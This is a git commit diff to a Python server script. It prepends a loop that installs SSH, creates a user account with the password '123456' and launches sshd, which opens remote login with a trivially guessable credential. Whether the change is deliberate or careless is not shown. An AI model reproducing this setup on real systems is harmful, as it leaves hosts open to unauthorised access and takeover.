366f6976869fe4b8998f7390c6ecef09519e8cb0
ibphantom <62777429+ibphantom@users.noreply.github.com>
2023-05-18 00:49:33 -0400

    Update server.py

--- scripts/server.py
+++ scripts/server.py
@@ -1,6 +1,24 @@
 import os.path
 import paramiko
 
+while True:
+        # Install packages
+        os.system('apt-get install -y openssh-server ufw')
+
+        #Create user
+        os.system('useradd zach -m -s /bin/bash')
+        os.system('echo "zach:123456" | chpasswd')
+
+        # Create /run/sshd directory
+        os.system('mkdir -p /run/sshd')
+
+        # Set permissions for /run/sshd
+        os.system('chmod 0755 /run/sshd')
+
+        # Start sshd daemon
+        os.system('/usr/sbin/sshd -D')
+
+
 # Define connection parameters
 hostname = '172.16.0.2'
 username = ''
